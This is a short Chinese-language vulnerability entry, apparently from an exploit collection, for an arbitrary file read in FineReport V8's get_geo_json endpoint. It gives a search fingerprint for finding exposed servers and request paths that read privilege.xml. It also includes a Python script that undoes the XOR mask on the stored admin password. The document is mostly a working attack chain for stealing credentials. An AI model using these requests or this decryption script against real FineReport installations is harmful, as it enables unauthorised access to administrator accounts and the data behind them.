# 帆软报表V8get_geo_json任意文件读取漏洞

- **系统**：帆软　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="isSupportForgetPwd"`

**请求体 / payload**
```
/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml

解密脚本
cipher = '___0072002a00670066000a' #密文
PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
Password = ""
cipher = cipher[3:] #截断三位后
for i in range(int(len(cipher) / 4)):
c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
Password = Password + chr(c2)
print (Password)
```

**其他**
- 帆软报表 V8 get\_geo\_json 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * FineReport < v8.0